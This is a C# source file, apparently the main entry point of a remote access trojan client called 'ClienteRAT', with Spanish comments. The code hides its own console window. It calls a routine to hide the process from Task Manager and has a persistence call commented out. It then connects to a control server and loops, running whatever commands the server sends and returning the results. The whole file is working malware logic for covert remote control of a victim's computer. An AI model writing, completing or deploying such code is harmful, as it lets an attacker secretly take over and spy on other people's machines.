using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Client.Native;
using Client.Commands;
using Client.Util;
using Client.Conexion;

namespace Client
{
    class ClienteRAT
    {
        static async Task Main(string[] args)
        {
            try
            {
                // Ocultar la consola al inicio
                IntPtr hwnd = Process.GetCurrentProcess().MainWindowHandle;
                if (hwnd != IntPtr.Zero)
                {
                    NativeMethods.ShowWindow(hwnd, NativeMethods.SW_HIDE);
                }

                // Ocultar el proceso del Administrador de Tareas y generar persistencia
                Functions.HideFromTaskManager();
                // Functions.AddPersistence();

                // Iniciar la conexión con el servidor
                ClientSocket.connect();

                // Bucle principal para recibir comandos y enviar respuestas
                while (ClientSocket.isConnected())
                {
                    try
                    {
                        byte[] buffer = new byte[1024];
                        int bytesRead = ClientSocket.getClientStream().Read(buffer, 0, buffer.Length);
                        if (bytesRead == 0)
                        {
                            Console.WriteLine("Conexión cerrada por el servidor.");
                            break;
                        }

                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();

                        string response = await HandleCommands.ProcessCommandAsync(command);
                        ClientSocket.SendResponse(response);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error: {ex.Message}");
                        ClientSocket.setConnected(false);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en la conexión: {ex.Message}");
            }
            finally
            {
                ClientSocket.disconnect();
            }
        }

       
    }
}
